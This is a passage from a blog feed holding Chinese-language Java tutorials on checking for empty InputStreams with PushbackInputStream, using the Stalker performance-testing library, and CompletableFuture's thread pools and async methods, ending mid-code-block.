        <content type="html"><![CDATA[<h2 id="应用背景"><a href="#应用背景" class="headerlink" title="应用背景"></a>应用背景</h2><ol><li><p>对文件进行格式转换时如word文件转pdf文件，判断流是否为0kb，如果传入0kb的流，Aspose低版本做文件转换时会出现stackoverflow。</p></li><li><p>后端对0kb文件的判断，进行一系列处理。</p></li></ol><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="1-InputStream-available"><a href="#1-InputStream-available" class="headerlink" title="1.InputStream.available"></a>1.InputStream.available</h3><p><img src="/img/inputstream/inputstream0.png" alt="InputStream.available"></p><p><img src="/img/inputstream/inputstream1.png" alt="FileInputStream.available"></p><p>上图为抽象类InputStream及FileInputStream类源码及注释，可以看到注释中使用estimate(估算、估计)即返回的不是真实的流的大小，而且InputStream的available方法永远返回0（The available method for class InputStream always returns 0.）。所以在业务上可以接受这个<code>estimate</code>的值且不是InputStream的available方法可以使用。</p><h3 id="2-toByteArray-转字节数组"><a href="#2-toByteArray-转字节数组" class="headerlink" title="2. toByteArray 转字节数组"></a>2. toByteArray 转字节数组</h3><p><code>IOUtils.toByteArray(InputStream)</code> 转成字节数组，既然通过流拿不到大小，我就曲线救国，把流转成字节数组后，不就可以为所欲为了吗。</p><p>这么做确实拿到值了，也能准确判断其是否为空。但是你一下子把流都读成字节数组了，不觉得内存可能有些扛不住吗。</p><p>InputStream 其实就是自来水管，连着自来水厂，不管后面是一吨水，还是十吨水，这个 InputStream 占的内存都是基本固定的，用专业术语来说，它的空间复杂度是 O(1) 。 你转成字节数组的话，就相当于把十吨水全部存到你家里。数据量小还好，如果碰到大数据量或者高并发，内存一下子就撑爆了。</p><p>听我一句劝，除非你能明确评估没有 OOM 风险，否则不要转成字节数组。</p><h3 id="3-read第一个字节"><a href="#3-read第一个字节" class="headerlink" title="3. read第一个字节"></a>3. read第一个字节</h3><p>既然我们只要判断其是否为空，那我干嘛费这么大劲， InputStream 不是有 read 方法吗，我 read 一次取第一个字节不就可以判断是否为空了吗。</p><p>我们前面说过，InputStream 是自来水管，覆水难收啊，你读了一个字节，那流里就少了一个字节。这就好比有个外卖员，你问他汤咸不咸，他喝了一口，说：汤挺好的，不咸。 你拿到少了一半的汤，会是什么心情。 InputStream 虽然提供了 reset 方法，但是默认是抛异常的哦，不是所有流都可以 reset ,就像有多少爱可以重来。</p><p><img src="/img/inputstream/inputstream2.png" alt="InputStream.reset"></p><h3 id="4-PushbackInputStream可回退的流"><a href="#4-PushbackInputStream可回退的流" class="headerlink" title="4.PushbackInputStream可回退的流"></a>4.PushbackInputStream可回退的流</h3><p><code>PushbackInputStream</code> ,顾名思义，就是能回退的流，你可以拿它包装一下原始的流，这样就可以实现检查流是否为空了呀。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查输入流是否为空，并返回包装后的流</span></span><br><span class="line"><span class="comment"> * 请注意，原始流已经被读了一个字节，后续不能直接对原始流进行读取</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inputStream inputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 包装之后的流，后续操作的都是这个流</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">checkStreamIsNotEmpty</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">        EmptyInputStreamException </span>&#123;</span><br><span class="line">    AssertKit.isNull(inputStream, <span class="string">"流不能为null"</span>);</span><br><span class="line">    PushbackInputStream pushbackInputStream = <span class="keyword">new</span> PushbackInputStream(inputStream);</span><br><span class="line">    <span class="keyword">int</span> b = pushbackInputStream.read();</span><br><span class="line">    <span class="keyword">if</span> (b == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> EmptyInputStreamException(<span class="string">"这个流是空的，啥也没有。 "</span> + inputStream);</span><br><span class="line">    &#125;</span><br><span class="line">    pushbackInputStream.unread(b);</span><br><span class="line">    <span class="keyword">return</span> pushbackInputStream;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h2><p><a href="https://mp.weixin.qq.com/s/RaUBUxjG_Ogkwecu0C-cdQ" target="_blank" rel="noopener">原文地址</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> inputstream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码性能评估工具库Stalker</title>
      <link href="/2022/09/24/stalker%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/09/24/stalker%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Java代码性能评估库Stalker"><a href="#Java代码性能评估库Stalker" class="headerlink" title="Java代码性能评估库Stalker"></a>Java代码性能评估库Stalker</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://github.com/blinkfox/stalker/tree/master" target="_blank" rel="noopener">文档地址</a></p><p> 这是一个简单的用来对Java代码做性能评估的工具库。</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>轻量级（jar包仅<code>26kb</code>）</li><li>API简单易用</li><li>易于集成或扩展</li></ul><h3 id="Maven集成"><a href="#Maven集成" class="headerlink" title="Maven集成"></a>Maven集成</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.blinkfox&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;stalker&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="API-介绍和使用"><a href="#API-介绍和使用" class="headerlink" title="API 介绍和使用"></a>API 介绍和使用</h3><h3 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h3><p>在对Java方法做性能测试之前，先准备好待测试的类和方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用于测量（仅测试使用）该类中的方法的执行耗时的类.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTestService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger log = LoggerFactory.getLogger(MyTestService<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试方法1，模拟业务代码耗时 2~5 ms，且会有约 1% 的几率执行异常.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 模拟运行时抛出异常.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">new</span> Random().nextInt(<span class="number">100</span>) == <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MyServiceException(<span class="string">"My Service Exception."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟运行占用约 2~5 ms 的时间.</span></span><br><span class="line">        <span class="keyword">this</span>.sleep(<span class="number">2L</span> + <span class="keyword">new</span> Random().nextInt(<span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试方法2，模拟业务代码运行占用约 2 ms 的时间.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fastHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sleep(<span class="number">2L</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 本线程调用该方法时，睡眠指定时间，用来模拟业务耗时.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> time 时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">(<span class="keyword">long</span> time)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(time);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            log.info(<span class="string">"InterruptedException"</span>, e);</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Stalker类"><a href="#Stalker类" class="headerlink" title="Stalker类"></a>Stalker类</h3><h4 id="1-最简示例"><a href="#1-最简示例" class="headerlink" title="1. 最简示例"></a>1. 最简示例</h4><p>以下代码将会预热<code>5</code>次，然后在单线程下正式执行<code>10</code>次，从而将运行结果计算统计并输出出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stalkerTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Stalker.run(() -&gt; <span class="keyword">new</span> MyTestService().hello());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>以上结果将默认在控制台输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|                                  threads: 1, concurrens: 1, warmups:5, runs: 10, printErrorLog: false                                   |</span><br><span class="line">+---+----------+-------+---------+---------+----------+---------+---------+---------+---------+---------------------+---------------------+</span><br><span class="line">|   |  Costs   | Total | Success | Failure |   Sum    |   Avg   |   Min   |   Max   | StdDev  | 95% LowerConfidence | 95% UpperConfidence |</span><br><span class="line">+---+----------+-------+---------+---------+----------+---------+---------+---------+---------+---------------------+---------------------+</span><br><span class="line">| 1 | 35.33 ms |  10   |   10    |    0    | 35.29 ms | 3.53 ms | 2.56 ms | 4.81 ms | 0.85 ms |       3.0 ms        |       4.06 ms       |</span><br><span class="line">+---+----------+-------+---------+---------+----------+---------+---------+---------+---------+---------------------+---------------------+</span><br></pre></td></tr></table></figure><h4 id="2-更全示例"><a href="#2-更全示例" class="headerlink" title="2. 更全示例"></a>2. 更全示例</h4><p>以下代码表示，两个方法<code>hello()</code>和<code>fastHello()</code>将会预热<code>1000</code>次，在<code>1000</code>个线程<code>200</code>个并发下，每次执行<code>10</code>次：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Stalker.run(Options.of(<span class="number">1000</span>, <span class="number">200</span>).warmups(<span class="number">1000</span>).runs(<span class="number">10</span>),</span><br><span class="line">        () -&gt; <span class="keyword">new</span> MyTestService().hello(),</span><br><span class="line">        () -&gt; <span class="keyword">new</span> MyTestService().fastHello());</span><br></pre></td></tr></table></figure><p>以上结果将默认在控制台输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|                               threads: 1000, concurrens: 200, warmups:1000, runs: 10, printErrorLog: false                               |</span><br><span class="line">+---+-----------+-------+---------+---------+---------+---------+---------+----------+---------+---------------------+---------------------+</span><br><span class="line">|   |   Costs   | Total | Success | Failure |   Sum   |   Avg   |   Min   |   Max    | StdDev  | 95% LowerConfidence | 95% UpperConfidence |</span><br><span class="line">+---+-----------+-------+---------+---------+---------+---------+---------+----------+---------+---------------------+---------------------+</span><br><span class="line">| 1 | 454.33 ms | 10000 |  9900   |   100   | 36.79 s | 3.72 ms | 2.01 ms | 11.89 ms | 1.31 ms |       3.69 ms       |       3.74 ms       |</span><br><span class="line">| 2 | 159.94 ms | 10000 |  10000  |    0    | 21.72 s | 2.17 ms | 2.01 ms | 3.24 ms  | 0.15 ms |       2.17 ms       |       2.18 ms       |</span><br><span class="line">+---+-----------+-------+---------+---------+---------+---------+---------+----------+---------+---------------------+---------------------+</span><br></pre></td></tr></table></figure><p>结果说明：</p><ul><li><code>Costs</code>: 实际正式运行所消耗的总时间</li><li><code>Total</code>: 正式运行的总次数</li><li><code>Success</code>: 正式运行的成功次数</li><li><code>Failure</code>: 正式运行的失败次数</li><li><code>Sum</code>: 每次运行的耗时结果求和之后的值</li><li><code>Avg</code>: 所有运行耗时结果的算术平均数</li><li><code>Min</code>: 所有运行耗时结果中最小值</li><li><code>Max</code>: 所有运行耗时结果中最大值</li><li><code>StdDev</code>: 所有运行耗时结果的标准方差</li><li><code>95% LowerConfidence</code>: 95%置信区间的最小边界值</li><li><code>95% LowerConfidence</code>: 95%置信区间的最大边界值</li></ul><h4 id="3-主要方法"><a href="#3-主要方法" class="headerlink" title="3. 主要方法"></a>3. 主要方法</h4><ul><li><code>void run(Runnable... runnables)</code>: 对若干个要执行的代码做性能测量评估.</li><li><code>void run(Options options, Runnable... runnables)</code>: 通过自定义的<code>Options</code>对若干个要执行的代码做性能测量评估.</li></ul><h3 id="Options类"><a href="#Options类" class="headerlink" title="Options类"></a>Options类</h3><p>Options表示做性能测量时的选项参数</p><h4 id="主要属性如下"><a href="#主要属性如下" class="headerlink" title="主要属性如下"></a>主要属性如下</h4><ul><li><code>name</code>: 选项参数的名称</li><li><code>threads</code>: 正式执行的线程数，默认为1。</li><li><code>concurrens</code>: 正式多线程下执行的并发数，默认为1。</li><li><code>warmups</code>: 单线程下的预热次数，默认5。</li><li><code>runs</code>: 每个线程正式执行的次数，默认10。</li><li><code>printErrorLog</code>: 是否打印错误日志，默认false。</li><li><code>outputs</code>: 将测量结果通过多种方式(集合)输出出来，默认为输出到控制台，可自定义实现<code>MeasureOutput</code>接口。</li></ul><h4 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h4><p>以下是构造<code>Options</code>实例的若干重载方法：</p><ul><li><code>Options of(String name)</code></li><li><code>Options of(int runs)</code></li><li><code>Options of(String name, int runs)</code></li><li><code>Options of(int threads, int concurrens)</code></li><li><code>Options of(String name, int threads, int concurrens)</code></li><li><code>Options of(String name, int threads, int concurrens, int runs)</code></li></ul><p>其他方法：</p><ul><li><code>boolean valid()</code>: 校验Options相关参数是否合法</li><li><code>Options named(String name)</code>: 设置 Options 实例的 name 属性</li><li><code>Options threads(int threads)</code>: 设置 Options 实例的 threads 属性</li><li><code>Options concurrens(int concurrens)</code>: 设置 Options 实例的 concurrens 属性</li><li><code>Options warmups(int warmups)</code>: 设置 Options 实例的 warmups 属性</li><li><code>Options runs(int runs)</code>: 设置 Options 实例的 runs 属性</li><li><code>Options printErrorLog(boolean printErrorLog)</code>: 设置 Options 实例的 printErrorLog 属性</li><li><code>Options outputs(MeasureOutput... measureOutputs)</code>: 自定义设置 Options 实例的 MeasureOutput 输出通道</li></ul><h3 id="Assert类"><a href="#Assert类" class="headerlink" title="Assert类"></a>Assert类</h3><p>Assert类主要用来做断言使用。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Assert.assertFaster(Options.of(),</span><br><span class="line">        () -&gt; <span class="keyword">new</span> MyTestService().fastHello(),</span><br><span class="line">        () -&gt; <span class="keyword">new</span> MyTestService().hello());</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Stalker </tag>
            
            <tag> 性能评估 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CompletableFuture</title>
      <link href="/2022/09/11/completableFuture/"/>
      <url>/2022/09/11/completableFuture/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><h3 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h3><p>CompletableFuture是对Future的扩展和增强。CompletableFuture实现了Future接口，并在此基础上进行了丰富的扩展，完美弥补了Future的局限性，同时CompletableFuture实现了对任务编排的能力。借助这项能力，可以轻松地组织不同任务的运行顺序、规则以及方式。从某种程度上说，这项能力是它的核心能力。而在以往，虽然通过CountDownLatch等工具类也可以实现任务的编排，但需要复杂的逻辑处理，不仅耗费精力且难以维护。</p><p>CompletionStage接口定义了任务编排的方法，执行某一阶段，可以向下执行后续阶段。异步执行的，默认线程池是ForkJoinPool.commonPool()，但为了业务之间互不影响，且便于定位问题，强烈推荐使用自定义线程池。</p><p>CompletableFuture中默认线程池如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据commonPool的并行度来选择,而并行度的计算是在ForkJoinPool的静态代码段完成的</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> useCommonPool =</span><br><span class="line">    (ForkJoinPool.getCommonPoolParallelism() &gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Executor asyncPool = useCommonPool ?</span><br><span class="line">    ForkJoinPool.commonPool() : <span class="keyword">new</span> ThreadPerTaskExecutor();</span><br></pre></td></tr></table></figure><p><code>ForkJoinPool</code>中初始化<code>commonPool</code>的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// initialize field offsets for CAS etc</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        U = sun.misc.Unsafe.getUnsafe();</span><br><span class="line">        Class&lt;?&gt; k = ForkJoinPool<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        CTL = U.objectFieldOffset</span><br><span class="line">            (k.getDeclaredField(<span class="string">"ctl"</span>));</span><br><span class="line">        RUNSTATE = U.objectFieldOffset</span><br><span class="line">            (k.getDeclaredField(<span class="string">"runState"</span>));</span><br><span class="line">        STEALCOUNTER = U.objectFieldOffset</span><br><span class="line">            (k.getDeclaredField(<span class="string">"stealCounter"</span>));</span><br><span class="line">        Class&lt;?&gt; tk = Thread<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        ……</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Error(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    commonMaxSpares = DEFAULT_COMMON_MAX_SPARES;</span><br><span class="line">    defaultForkJoinWorkerThreadFactory =</span><br><span class="line">        <span class="keyword">new</span> DefaultForkJoinWorkerThreadFactory();</span><br><span class="line">    modifyThreadPermission = <span class="keyword">new</span> RuntimePermission(<span class="string">"modifyThread"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用makeCommonPool方法创建commonPool,其中并行度为逻辑核数-1</span></span><br><span class="line">    common = java.security.AccessController.doPrivileged</span><br><span class="line">        (<span class="keyword">new</span> java.security.PrivilegedAction&lt;ForkJoinPool&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> ForkJoinPool <span class="title">run</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> makeCommonPool(); &#125;&#125;);</span><br><span class="line">    <span class="keyword">int</span> par = common.config &amp; SMASK; <span class="comment">// report 1 even if threads disabled</span></span><br><span class="line">    commonParallelism = par &gt; <span class="number">0</span> ? par : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-功能"><a href="#1-2-功能" class="headerlink" title="1.2 功能"></a>1.2 功能</h3><h4 id="1-2-1-常用方法"><a href="#1-2-1-常用方法" class="headerlink" title="1.2.1 常用方法"></a>1.2.1 常用方法</h4><p>依赖关系</p><ul><li>thenApply()：把前面任务的执行结果，交给后面的Function</li><li>thenCompose()：用来连接两个有依赖关系的任务，结果由第二个任务返回.</li></ul><p>and集合关系</p><ul><li>thenCombine()：合并任务，有返回值</li><li>thenAccepetBoth()：两个任务执行完成后，将结果交给thenAccepetBoth处理，无返回值</li><li>runAfterBoth()：两个任务都执行完成后，执行下一步操作(Runnable类型任务)</li></ul><p>or聚合关系</p><ul><li>applyToEither()：两个任务哪个执行的快，就使用哪一个结果，有返回值</li><li>acceptEither()：两个任务哪个执行的快，就消费哪一个结果，无返回值</li><li>runAfterEither()：任意一个任务执行完成，进行下一步操作(Runnable类型任务)</li></ul><p>并行执行</p><ul><li>allOf()：当所有给定的 CompletableFuture 完成时，返回一个新的 CompletableFuture</li><li>anyOf()：当任何一个给定的CompletablFuture完成时，返回一个新的CompletableFuture</li></ul><p>结果处理</p><ul><li>whenComplete：当任务完成时，将使用结果(或 null)和此阶段的异常(或 null如果没有)执行给定操作</li><li>exceptionally：返回一个新的CompletableFuture，当前面的CompletableFuture完成时，它也完成，当它异常完成时，给定函数的异常触发这个CompletableFuture的完成</li></ul><h4 id="1-2-2-异步操作"><a href="#1-2-2-异步操作" class="headerlink" title="1.2.2 异步操作"></a>1.2.2 异步操作</h4><p>CompletableFuture提供了四个静态方法来创建一个异步操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CompletableFuture&lt;Void&gt; <span class="title">runAsync</span><span class="params">(Runnable runnable)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CompletableFuture&lt;Void&gt; <span class="title">runAsync</span><span class="params">(Runnable runnable, Executor executor)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> &lt;U&gt; CompletableFuture&lt;U&gt; <span class="title">supplyAsync</span><span class="params">(Supplier&lt;U&gt; supplier)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> &lt;U&gt; CompletableFuture&lt;U&gt; <span class="title">supplyAsync</span><span class="params">(Supplier&lt;U&gt; supplier, Executor executor)</span></span></span><br></pre></td></tr></table></figure><p>这四个方法的区别：</p><ul><li>runAsync() 以Runnable函数式接口类型为参数，没有返回结果，supplyAsync() 以Supplier函数式接口类型为参数，返回结果类型为U；Supplier接口的 get()是有返回值的(会阻塞)</li><li>使用没有指定Executor的方法时，内部使用ForkJoinPool.commonPool() 作为它的线程池执行异步代码。如果指定线程池，则使用指定的线程池运行。</li><li>默认情况下CompletableFuture会使用公共的ForkJoinPool线程池，这个线程池默认创建的线程数是 CPU 的核数（也可以通过 JVM option:-Djava.util.concurrent.ForkJoinPool.common.parallelism 来设置ForkJoinPool线程池的线程数）。如果所有CompletableFuture共享一个线程池，那么一旦有任务执行一些很慢的 I/O 操作，就会导致线程池中所有线程都阻塞在 I/O 操作上，从而造成线程饥饿，进而影响整个系统的性能。所以，强烈建议你要根据不同的业务类型创建不同的线程池，以避免互相干扰</li></ul><h4 id="异步操作"><a href="#异步操作" class="headerlink" title="异步操作"></a>异步操作</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Runnable runnable = () -&gt; System.out.println(<span class="string">"无返回结果异步任务"</span>);</span><br><span class="line">CompletableFuture.runAsync(runnable);</span><br><span class="line"></span><br><span class="line">CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; &#123;</span><br><span class="line">    System.out.println(<span class="string">"有返回值的异步任务"</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello World"</span>;</span><br><span class="line">&#125;);</span><br><span class="line">String result = future.get();</span><br></pre></td></tr></table></figure><h4 id="获取结果-join-amp-get"><a href="#获取结果-join-amp-get" class="headerlink" title="获取结果(join&amp;get)"></a>获取结果(join&amp;get)</h4><p>join()和get()方法都是用来获取CompletableFuture异步之后的返回值。join()方法抛出的是uncheck异常（即未经检查的异常),不会强制开发者抛出。get()方法抛出的是经过检查的异常，ExecutionException, InterruptedException 需要用户手动处理（抛出或者 try catch）</p><h4 id="结果处理"><a href="#结果处理" class="headerlink" title="结果处理"></a>结果处理</h4><p>当CompletableFuture的计算结果完成，或者抛出异常的时候，我们可以执行特定的 Action。主要是下面的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CompletableFuture&lt;T&gt; <span class="title">whenComplete</span><span class="params">(BiConsumer&lt;? <span class="keyword">super</span> T,? <span class="keyword">super</span> Throwable&gt; action)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CompletableFuture&lt;T&gt; <span class="title">whenCompleteAsync</span><span class="params">(BiConsumer&lt;? <span class="keyword">super</span> T,? <span class="keyword">super</span> Throwable&gt; action)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CompletableFuture&lt;T&gt; <span class="title">whenCompleteAsync</span><span class="params">(BiConsumer&lt;? <span class="keyword">super</span> T,? <span class="keyword">super</span> Throwable&gt; action, Executor executor)</span></span></span><br></pre></td></tr></table></figure><ul><li><code>Action</code>的类型是<code>BiConsumer&lt;? super T,? super Throwable&gt;</code>，它可以处理正常的计算结果，或者异常情况。</li><li>方法不以<code>Async</code>结尾，意味着Action使用相同的线程执行，而<code>Async</code>可能会使用其它的线程去执行(如果使用相同的线程池，也可能会被同一个线程选中执行)。</li><li>这几个方法都会返回<code>CompletableFuture</code>，当Action执行完毕后它的结果返回原始的CompletableFuture的计算结果或者返回异常</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 